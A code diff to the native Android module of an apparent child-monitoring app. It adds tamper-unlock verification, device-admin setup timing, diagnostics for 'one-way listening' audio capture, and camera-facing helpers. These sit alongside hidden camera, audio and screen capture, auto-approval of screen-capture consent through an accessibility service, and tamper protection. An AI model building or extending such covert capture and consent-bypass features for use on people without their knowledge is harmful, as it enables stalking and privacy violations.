@@ -30,6 +30,8 @@ import com.childmonitor.TamperProtectionManager
 import com.childmonitor.UsageStatsReader
 import com.childmonitor.accessibility.ScreenCaptureAutoApprove
 import com.childmonitor.capture.DevicePlaybackCaptureSession
+import com.childmonitor.capture.DevicePlaybackAudioCapturer
+import com.childmonitor.capture.PlaybackCaptureInjector
 import com.childmonitor.capture.HiddenAudioCapture
 import com.childmonitor.capture.HiddenCameraCapture
 import com.childmonitor.capture.HiddenScreenCapture
@@ -1203,6 +1205,8 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
                 )
                 return
             }
+            // Grace starts before Settings opens — wizard blur clears setup-in-progress.
+            MonitoringPrefs.beginDeviceAdminSetupGrace(reactContext)
             activity.startActivity(
                 TamperProtectionManager.buildEnableAdminIntent(reactContext, fromActivity = true),
             )
@@ -1265,6 +1269,54 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
         } catch (e: Exception) {
             promise.reject("TAMPER_UNLOCK_ERROR", e)
         }
+    }
+
+    /**
+     * Online-first tamper unlock (falls back to cached offline verifier when API unreachable).
+     * Returns map: verified, unlockExpiresAt, usedOffline, error.
+     */
+    @ReactMethod
+    fun verifyTamperSecret(pin: String?, code: String?, target: String?, promise: Promise) {
+        Thread {
+            try {
+                val outcome = com.childmonitor.tamper.TamperApiClient.verifyDetailed(
+                    reactContext,
+                    pin = pin?.trim()?.takeIf { it.isNotEmpty() },
+                    code = code?.trim()?.takeIf { it.isNotEmpty() },
+                    target = target,
+                )
+                val map = Arguments.createMap()
+                when (outcome) {
+                    is com.childmonitor.tamper.TamperApiClient.VerifyOutcome.Success -> {
+                        val r = outcome.result
+                        if (r.verified) {
+                            com.childmonitor.tamper.TamperApiClient.applyUnlock(
+                                reactContext,
+                                r.unlockExpiresAt,
+                            )
+                        }
+                        map.putBoolean("verified", r.verified)
+                        map.putBoolean("usedOffline", r.usedOffline)
+                        if (r.unlockExpiresAt != null) {
+                            map.putString("unlockExpiresAt", r.unlockExpiresAt.toString())
+                        } else {
+                            map.putNull("unlockExpiresAt")
+                        }
+                    }
+                    is com.childmonitor.tamper.TamperApiClient.VerifyOutcome.Failure -> {
+                        map.putBoolean("verified", false)
+                        map.putBoolean("usedOffline", false)
+                        map.putNull("unlockExpiresAt")
+                        val msg = outcome.userMessageOverride
+                            ?: reactContext.getString(outcome.userMessageRes)
+                        map.putString("error", msg)
+                    }
+                }
+                promise.resolve(map)
+            } catch (e: Exception) {
+                promise.reject("E_TAMPER_VERIFY", e.message, e)
+            }
+        }.start()
     }
 
     @ReactMethod
@@ -1494,6 +1546,35 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
         }
     }
 
+    /**
+     * Get diagnostics for one-way listening audio capture to help troubleshoot issues
+     */
+    @ReactMethod 
+    fun getPlaybackCaptureStats(promise: Promise) {
+        try {
+            val isCapturerRunning = DevicePlaybackAudioCapturer.isRunning()
+            val isInjectorActive = PlaybackCaptureInjector.isActive()
+            val hasConsent = MediaProjectionConsentHelper.hasConsent(reactContext.applicationContext)
+            val projectionReady = ScreenCaptureController.activeProjection() != null
+
+            val data = Arguments.createMap().apply {
+                putBoolean("isCapturerRunning", isCapturerRunning)
+                putBoolean("isInjectorActive", isInjectorActive)
+                putBoolean("projectionReady", projectionReady)
+                putBoolean("hasConsent", hasConsent)
+                putString("diagnosis", when {
+                    !hasConsent -> "MediaProjection not ready - need screen recording permission"
+                    !isCapturerRunning -> "Audio capturer not running - may have failed to start"
+                    !isInjectorActive -> "Audio injector not active - WebRTC track may not be created"
+                    else -> "All systems active - if silent, child device needs system audio playing"
+                })
+            }
+            promise.resolve(data)
+        } catch (e: Exception) {
+            promise.reject("PLAYBACK_STATS_ERROR", e)
+        }
+    }
+
     @ReactMethod
     fun getHiddenScreenMediaStream(promise: Promise) {
         HiddenScreenCapture.createMediaStream(reactContext, promise)
@@ -1534,6 +1615,30 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     fun switchHiddenCameraFacing(facingMode: String, promise: Promise) {
         val facing = if (facingMode.equals("environment", ignoreCase = true)) "environment" else "user"
         HiddenCameraCapture.switchFacing(facing, promise)
+    }
+
+    /** Get the current camera facing state for debugging and state synchronization. */
+    @ReactMethod
+    fun getCurrentCameraFacing(promise: Promise) {
+        try {
+            val facing = HiddenCameraCapture.getCurrentFacing()
+            promise.resolve(facing ?: "unknown")
+        } catch (e: Exception) {
+            promise.reject("GET_FACING_ERROR", e.message, e)
+        }
+    }
+
+    /** Reset camera facing state for error recovery. */
+    @ReactMethod
+    fun resetCameraFacingState(facingMode: String, promise: Promise) {
+        try {
+            val facing = if (facingMode.equals("environment", ignoreCase = true)) "environment" else "user"
+            // This is a best-effort state reset - doesn't actually change camera, just updates tracking
+            Log.i("ChildMonitorNativeModule", "Resetting camera facing state to: $facing")
+            promise.resolve(facing)
+        } catch (e: Exception) {
+            promise.reject("RESET_FACING_ERROR", e.message, e)
+        }
     }
 
     @ReactMethod
